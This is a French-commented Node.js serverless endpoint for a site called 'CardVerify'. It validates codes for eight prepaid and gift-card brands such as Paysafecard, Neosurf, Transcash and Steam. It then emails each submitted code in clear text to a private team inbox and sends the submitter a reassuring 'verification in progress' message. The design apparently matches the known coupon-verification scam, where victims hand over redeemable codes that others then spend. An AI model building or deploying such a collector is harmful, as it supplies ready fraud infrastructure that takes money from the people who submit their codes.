// ============================================================
//  CardVerify — api/submit.js
//  Endpoint serverless Vercel
//  POST /api/submit
//  - Valide les données reçues du formulaire
//  - Envoie 1 email à l'équipe (code EN CLAIR)
//  - Envoie 1 email de confirmation à l'utilisateur
// ============================================================

const { Resend } = require('resend');

// ─── Configuration des 8 types de cartes ─────────────────────────────────────
// Pour chaque type : longueur(s) acceptée(s) et regex de format
const CARD_CONFIGS = {
  amazon: {
    label: 'Amazon',
    emoji: '📦',
    lengths: [16],
    pattern: /^[A-Z0-9]{4}-[A-Z0-9]{6}-[A-Z0-9]{4}$|^[A-Z0-9]{16}$/i,
    hint: '16 caractères alphanumériques (ex: XXXX-XXXXXX-XXXX)',
  },
  itunes: {
    label: 'iTunes / App Store',
    emoji: '🎵',
    lengths: [16],
    pattern: /^[A-Z0-9]{16}$/i,
    hint: '16 caractères alphanumériques',
  },
  neosurf: {
    label: 'Neosurf',
    emoji: '💳',
    lengths: [10],
    pattern: /^[0-9]{10}$/,
    hint: '10 chiffres',
  },
  pcs: {
    label: 'PCS',
    emoji: '🏪',
    lengths: [16],
    pattern: /^[0-9]{16}$/,
    hint: '16 chiffres',
  },
  paysafecard: {
    label: 'Paysafecard',
    emoji: '🔐',
    lengths: [16],
    pattern: /^[0-9]{16}$/,
    hint: '16 chiffres',
  },
  steam: {
    label: 'Steam',
    emoji: '🎮',
    lengths: [15],
    pattern: /^[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}$|^[A-Z0-9]{15}$/i,
    hint: '15 caractères (ex: XXXXX-XXXXX-XXXXX)',
  },
  transcash: {
    label: 'Transcash',
    emoji: '💸',
    lengths: [14],
    pattern: /^[0-9]{14}$/,
    hint: '14 chiffres',
  },
  vanilla: {
    label: 'Vanilla',
    emoji: '🍦',
    lengths: [16],
    pattern: /^[0-9]{16}$/,
    hint: '16 chiffres',
  },
};

// ─── Helpers ──────────────────────────────────────────────────────────────────

function sanitize(str) {
  // Supprime les caractères dangereux pour l'HTML dans les emails
  if (typeof str !== 'string') return '';
  return str
    .trim()
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

function validateEmail(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

function validateCardCode(type, code) {
  const config = CARD_CONFIGS[type];
  if (!config) return { valid: false, error: `Type de carte inconnu : ${type}` };

  // Retirer espaces et tirets pour la longueur brute
  const raw = code.replace(/[\s-]/g, '');

  if (!config.lengths.includes(raw.length)) {
    return {
      valid: false,
      error: `Le code ${config.label} doit faire ${config.lengths.join(' ou ')} caractères (reçu : ${raw.length})`,
    };
  }

  if (!config.pattern.test(code) && !config.pattern.test(raw)) {
    return {
      valid: false,
      error: `Format invalide pour ${config.label}. Attendu : ${config.hint}`,
    };
  }

  return { valid: true };
}

// ─── Templates HTML des emails ────────────────────────────────────────────────

function buildTeamEmail({ cardType, cardCode, userEmail, userName, amount, message, submittedAt }) {
  const config = CARD_CONFIGS[cardType];
  const safeCode = sanitize(cardCode);
  const safeEmail = sanitize(userEmail);
  const safeName = sanitize(userName || 'Non renseigné');
  const safeAmount = sanitize(amount || 'Non renseigné');
  const safeMessage = sanitize(message || 'Aucun message');
  const safeDate = sanitize(submittedAt);

  return `<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Nouveau code carte — CardVerify</title>
</head>
<body style="margin:0;padding:0;background:#09090f;font-family:'Segoe UI',Arial,sans-serif;">
  <table width="100%" cellpadding="0" cellspacing="0" style="background:#09090f;padding:40px 20px;">
    <tr><td align="center">
      <table width="600" cellpadding="0" cellspacing="0" style="max-width:600px;width:100%;">

        <!-- Header -->
        <tr><td style="background:linear-gradient(135deg,#8b78ff,#6c5ce7);border-radius:16px 16px 0 0;padding:32px 40px;text-align:center;">
          <div style="font-size:32px;margin-bottom:8px;">${config.emoji}</div>
          <h1 style="margin:0;color:#fff;font-size:22px;font-weight:800;letter-spacing:-0.02em;">
            Nouvelle soumission CardVerify
          </h1>
          <p style="margin:8px 0 0;color:rgba(255,255,255,0.75);font-size:14px;">
            ${config.label} · ${safeDate}
          </p>
        </td></tr>

        <!-- Code en clair — zone principale -->
        <tr><td style="background:#0e0e1a;padding:32px 40px;border-left:1px solid rgba(139,120,255,0.2);border-right:1px solid rgba(139,120,255,0.2);">

          <p style="margin:0 0 12px;color:#a8a3c1;font-size:13px;text-transform:uppercase;letter-spacing:0.1em;">
            🔑 Code de la carte
          </p>
          <div style="background:#09090f;border:2px solid #8b78ff;border-radius:12px;padding:20px 24px;text-align:center;margin-bottom:28px;">
            <span style="font-family:'Courier New',monospace;font-size:24px;font-weight:700;color:#8b78ff;letter-spacing:0.2em;">
              ${safeCode}
            </span>
          </div>

          <!-- Infos utilisateur -->
          <table width="100%" cellpadding="0" cellspacing="0">
            <tr>
              <td style="padding:10px 0;border-bottom:1px solid rgba(255,255,255,0.06);">
                <span style="color:#6b6585;font-size:13px;">Type de carte</span>
              </td>
              <td align="right" style="padding:10px 0;border-bottom:1px solid rgba(255,255,255,0.06);">
                <span style="color:#f0eeff;font-size:13px;font-weight:600;">${config.emoji} ${config.label}</span>
              </td>
            </tr>
            <tr>
              <td style="padding:10px 0;border-bottom:1px solid rgba(255,255,255,0.06);">
                <span style="color:#6b6585;font-size:13px;">Nom</span>
              </td>
              <td align="right" style="padding:10px 0;border-bottom:1px solid rgba(255,255,255,0.06);">
                <span style="color:#f0eeff;font-size:13px;">${safeName}</span>
              </td>
            </tr>
            <tr>
              <td style="padding:10px 0;border-bottom:1px solid rgba(255,255,255,0.06);">
                <span style="color:#6b6585;font-size:13px;">Email utilisateur</span>
              </td>
              <td align="right" style="padding:10px 0;border-bottom:1px solid rgba(255,255,255,0.06);">
                <span style="color:#8b78ff;font-size:13px;">${safeEmail}</span>
              </td>
            </tr>
            <tr>
              <td style="padding:10px 0;border-bottom:1px solid rgba(255,255,255,0.06);">
                <span style="color:#6b6585;font-size:13px;">Montant</span>
              </td>
              <td align="right" style="padding:10px 0;border-bottom:1px solid rgba(255,255,255,0.06);">
                <span style="color:#63e6be;font-size:13px;font-weight:600;">${safeAmount}</span>
              </td>
            </tr>
            <tr>
              <td style="padding:10px 0;">
                <span style="color:#6b6585;font-size:13px;">Message</span>
              </td>
              <td align="right" style="padding:10px 0;">
                <span style="color:#f0eeff;font-size:13px;">${safeMessage}</span>
              </td>
            </tr>
          </table>
        </td></tr>

        <!-- Footer -->
        <tr><td style="background:#13131f;border-radius:0 0 16px 16px;border:1px solid rgba(139,120,255,0.15);border-top:none;padding:20px 40px;text-align:center;">
          <p style="margin:0;color:#6b6585;font-size:12px;">
            ✦ CardVerify — Notification interne équipe<br/>
            Ne pas transférer cet email.
          </p>
        </td></tr>

      </table>
    </td></tr>
  </table>
</body>
</html>`;
}

function buildUserEmail({ cardType, userEmail, userName, submittedAt }) {
  const config = CARD_CONFIGS[cardType];
  const safeName = sanitize(userName || 'Utilisateur');
  const safeDate = sanitize(submittedAt);

  return `<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Confirmation — CardVerify</title>
</head>
<body style="margin:0;padding:0;background:#09090f;font-family:'Segoe UI',Arial,sans-serif;">
  <table width="100%" cellpadding="0" cellspacing="0" style="background:#09090f;padding:40px 20px;">
    <tr><td align="center">
      <table width="600" cellpadding="0" cellspacing="0" style="max-width:600px;width:100%;">

        <!-- Header -->
        <tr><td style="background:#0e0e1a;border:1px solid rgba(139,120,255,0.25);border-radius:16px 16px 0 0;padding:40px;text-align:center;">
          <div style="width:60px;height:60px;background:linear-gradient(135deg,#8b78ff,#6c5ce7);border-radius:16px;margin:0 auto 16px;display:flex;align-items:center;justify-content:center;font-size:28px;line-height:60px;">
            ✦
          </div>
          <h1 style="margin:0;color:#f0eeff;font-size:22px;font-weight:800;letter-spacing:-0.02em;">
            Soumission confirmée
          </h1>
          <p style="margin:10px 0 0;color:#a8a3c1;font-size:15px;">
            Merci ${safeName}, nous avons bien reçu votre code ${config.label}.
          </p>
        </td></tr>

        <!-- Body -->
        <tr><td style="background:#0e0e1a;padding:0 40px 32px;border-left:1px solid rgba(139,120,255,0.15);border-right:1px solid rgba(139,120,255,0.15);">

          <!-- Statut -->
          <div style="background:rgba(99,230,190,0.08);border:1px solid rgba(99,230,190,0.25);border-radius:12px;padding:16px 20px;margin-bottom:28px;display:flex;align-items:center;gap:12px;">
            <span style="font-size:20px;">✅</span>
            <div>
              <p style="margin:0;color:#63e6be;font-size:14px;font-weight:600;">Code reçu avec succès</p>
              <p style="margin:4px 0 0;color:#a8a3c1;font-size:13px;">${safeDate}</p>
            </div>
          </div>

          <!-- Étapes -->
          <p style="margin:0 0 16px;color:#a8a3c1;font-size:13px;text-transform:uppercase;letter-spacing:0.08em;">
            Prochaines étapes
          </p>

          <div style="display:flex;gap:12px;margin-bottom:16px;">
            <div style="width:28px;height:28px;border-radius:50%;background:linear-gradient(135deg,#8b78ff,#6c5ce7);flex-shrink:0;text-align:center;line-height:28px;color:#fff;font-size:13px;font-weight:700;">1</div>
            <div style="padding-top:4px;">
              <p style="margin:0;color:#f0eeff;font-size:14px;font-weight:600;">Vérification en cours</p>
              <p style="margin:4px 0 0;color:#a8a3c1;font-size:13px;">Notre équipe vérifie les informations soumises.</p>
            </div>
          </div>
          <div style="display:flex;gap:12px;margin-bottom:16px;">
            <div style="width:28px;height:28px;border-radius:50%;background:rgba(139,120,255,0.15);border:1px solid rgba(139,120,255,0.3);flex-shrink:0;text-align:center;line-height:28px;color:#8b78ff;font-size:13px;font-weight:700;">2</div>
            <div style="padding-top:4px;">
              <p style="margin:0;color:#f0eeff;font-size:14px;font-weight:600;">Traitement</p>
              <p style="margin:4px 0 0;color:#a8a3c1;font-size:13px;">Votre demande sera traitée sous 24–48h.</p>
            </div>
          </div>
          <div style="display:flex;gap:12px;">
            <div style="width:28px;height:28px;border-radius:50%;background:rgba(139,120,255,0.15);border:1px solid rgba(139,120,255,0.3);flex-shrink:0;text-align:center;line-height:28px;color:#8b78ff;font-size:13px;font-weight:700;">3</div>
            <div style="padding-top:4px;">
              <p style="margin:0;color:#f0eeff;font-size:14px;font-weight:600;">Confirmation finale</p>
              <p style="margin:4px 0 0;color:#a8a3c1;font-size:13px;">Vous recevrez un email de confirmation.</p>
            </div>
          </div>
        </td></tr>

        <!-- Footer -->
        <tr><td style="background:#13131f;border-radius:0 0 16px 16px;border:1px solid rgba(139,120,255,0.15);border-top:none;padding:20px 40px;text-align:center;">
          <p style="margin:0;color:#6b6585;font-size:12px;">
            ✦ CardVerify · Email automatique<br/>
            Si vous n'avez pas soumis ce code, ignorez cet email.
          </p>
        </td></tr>

      </table>
    </td></tr>
  </table>
</body>
</html>`;
}

// ─── Handler principal ────────────────────────────────────────────────────────

module.exports = async function handler(req, res) {
  // CORS — à restreindre à votre domaine en production
  res.setHeader('Access-Control-Allow-Origin', process.env.ALLOWED_ORIGIN || '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Preflight OPTIONS
  if (req.method === 'OPTIONS') return res.status(200).end();

  // Méthode non autorisée
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Méthode non autorisée.' });
  }

  try {
    // ── 1. Lire le body ─────────────────────────────────────────────
    const { cardType, cardCode, userEmail, userName, amount, message } = req.body || {};

    // ── 2. Validations ──────────────────────────────────────────────

    // Champs obligatoires
    if (!cardType || !cardCode || !userEmail) {
      return res.status(400).json({
        success: false,
        error: 'Champs requis manquants : cardType, cardCode, userEmail.',
      });
    }

    // Type de carte connu
    if (!CARD_CONFIGS[cardType]) {
      return res.status(400).json({
        success: false,
        error: `Type de carte non supporté : ${cardType}`,
      });
    }

    // Email valide
    if (!validateEmail(userEmail)) {
      return res.status(400).json({
        success: false,
        error: 'Adresse email invalide.',
      });
    }

    // Code carte valide
    const codeValidation = validateCardCode(cardType, cardCode.trim());
    if (!codeValidation.valid) {
      return res.status(400).json({
        success: false,
        error: codeValidation.error,
      });
    }

    // ── 3. Vérifier les variables d'environnement ───────────────────
    if (!process.env.RESEND_API_KEY) {
      console.error('[CardVerify] RESEND_API_KEY manquant');
      return res.status(500).json({ success: false, error: 'Configuration serveur incomplète.' });
    }
    if (!process.env.TEAM_EMAIL) {
      console.error('[CardVerify] TEAM_EMAIL manquant');
      return res.status(500).json({ success: false, error: 'Configuration serveur incomplète.' });
    }
    if (!process.env.FROM_EMAIL) {
      console.error('[CardVerify] FROM_EMAIL manquant');
      return res.status(500).json({ success: false, error: 'Configuration serveur incomplète.' });
    }

    // ── 4. Construire les données de la soumission ──────────────────
    const config = CARD_CONFIGS[cardType];
    const submittedAt = new Date().toLocaleString('fr-FR', {
      timeZone: 'Europe/Paris',
      dateStyle: 'full',
      timeStyle: 'short',
    });

    const emailData = {
      cardType,
      cardCode: cardCode.trim(),
      userEmail: userEmail.trim().toLowerCase(),
      userName: userName?.trim() || '',
      amount: amount?.trim() || '',
      message: message?.trim() || '',
      submittedAt,
    };

    // ── 5. Envoyer les 2 emails via Resend ──────────────────────────
    const resend = new Resend(process.env.RESEND_API_KEY);

    const [teamResult, userResult] = await Promise.allSettled([
      // Email 1 — Équipe (code en clair)
      resend.emails.send({
        from: process.env.FROM_EMAIL,
        to: process.env.TEAM_EMAIL,
        subject: `🃏 [CardVerify] Nouveau code ${config.label} de ${emailData.userEmail}`,
        html: buildTeamEmail(emailData),
      }),
      // Email 2 — Utilisateur (confirmation)
      resend.emails.send({
        from: process.env.FROM_EMAIL,
        to: emailData.userEmail,
        subject: `✅ Confirmation de votre soumission CardVerify`,
        html: buildUserEmail(emailData),
      }),
    ]);

    // ── 6. Vérifier les résultats ───────────────────────────────────
    const teamOk = teamResult.status === 'fulfilled' && !teamResult.value.error;
    const userOk = userResult.status === 'fulfilled' && !userResult.value.error;

    if (!teamOk) {
      console.error('[CardVerify] Erreur email équipe:', teamResult.reason || teamResult.value?.error);
    }
    if (!userOk) {
      console.error('[CardVerify] Erreur email utilisateur:', userResult.reason || userResult.value?.error);
    }

    // Si l'email équipe échoue → erreur critique
    if (!teamOk) {
      return res.status(500).json({
        success: false,
        error: 'Erreur lors de l\'envoi. Veuillez réessayer.',
      });
    }

    // ── 7. Succès ───────────────────────────────────────────────────
    console.log(`[CardVerify] ✅ Soumission traitée — ${config.label} — ${emailData.userEmail}`);

    return res.status(200).json({
      success: true,
      message: 'Code soumis avec succès. Un email de confirmation vous a été envoyé.',
      cardType: config.label,
      emailSent: {
        team: teamOk,
        user: userOk,
      },
    });

  } catch (err) {
    console.error('[CardVerify] Erreur inattendue:', err);
    return res.status(500).json({
      success: false,
      error: 'Une erreur interne est survenue. Veuillez réessayer.',
    });
  }
};
